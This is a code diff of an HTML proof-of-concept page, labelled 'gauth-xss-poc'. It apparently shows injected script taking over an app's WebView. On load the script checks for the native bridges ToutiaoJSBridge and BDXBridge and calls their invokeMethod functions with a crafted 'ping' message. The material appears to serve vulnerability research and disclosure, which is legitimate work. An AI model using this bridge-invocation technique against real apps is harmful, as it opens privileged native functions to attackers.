@@ -7,30 +7,32 @@
     <script>
       alert("WebView controlled");
 
-      // After 2 seconds, check which JS bridges are available
       setTimeout(function () {
         var msg = [];
 
-        if (window.JS2NativeBridge) {
-          msg.push("JS2NativeBridge");
-        }
-        if (window.BDXBridge) {
-          msg.push("BDXBridge");
-        }
-        if (window.ToutiaoJSBridge) {
-          msg.push("ToutiaoJSBridge");
-        }
-        if (window.__WebViewRequest) {
-          msg.push("__WebViewRequest");
-        }
-        if (window.__WebViewReport) {
-          msg.push("__WebViewReport");
-        }
+        if (window.BDXBridge) msg.push("BDXBridge");
+        if (window.ToutiaoJSBridge) msg.push("ToutiaoJSBridge");
 
-        if (msg.length === 0) {
-          alert("Available bridges: none");
-        } else {
-          alert("Available bridges: " + msg.join(", "));
+        alert("Available bridges: " + (msg.join(", ") || "none"));
+
+        // Try calling invokeMethod / _invokeMethod with a harmless payload
+        try {
+          var payload = JSON.stringify({
+            func: "ping",
+            params: { from: "gauth-xss-poc" },
+            __msg_type: "call",
+            __callback_id: "9999"
+          });
+
+          if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
+            ToutiaoJSBridge.invokeMethod(payload);
+            alert("Called ToutiaoJSBridge.invokeMethod(ping)");
+          } else if (window.BDXBridge && BDXBridge._invokeMethod) {
+            BDXBridge._invokeMethod(payload);
+            alert("Called BDXBridge._invokeMethod(ping)");
+          }
+        } catch (e) {
+          alert("Bridge call error: " + e);
         }
       }, 2000);
     </script>
